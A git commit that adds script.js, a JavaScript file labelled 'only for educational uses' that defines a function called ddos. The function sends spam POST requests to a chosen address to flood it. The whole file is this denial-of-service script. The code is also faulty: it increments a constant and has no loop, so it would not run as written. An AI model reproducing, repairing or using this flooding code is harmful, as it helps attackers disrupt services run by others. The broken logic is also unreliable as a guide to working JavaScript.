c83662d8ee9c1d86a5de3651524328c3d14f23e8
CodeSalvageON <65372786+CodeSalvageON@users.noreply.github.com>
2020-07-12 22:52:06 -0400

    Create script.js

---
+++ script.js
@@ -0,0 +1,32 @@
+//Script only for educational uses
+//Created by CodeSalvageON
+
+const turn = 0;
+
+function ddos(address, times) {
+  var http = new XMLHttpRequest();
+  
+  //Check if address or times is undefined
+  if (address == undefined) {
+    console.log('FAILED: ADDRESS IS UNDEFINED');
+    return false;
+  }
+
+  if (times == undefined) {
+    console.log('FAILED: TIMES IS UNDEFINED');
+  }
+
+  //Check the amount of times
+  if (turn == times) {
+    console.log('FINISHED');
+  }
+  else{
+    http.open("POST", address, true);
+    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    
+    spam_data = "CodeSalvageON on top";
+    http.send(spam_data);
+    
+    turn = turn + 1;
+  }
+}
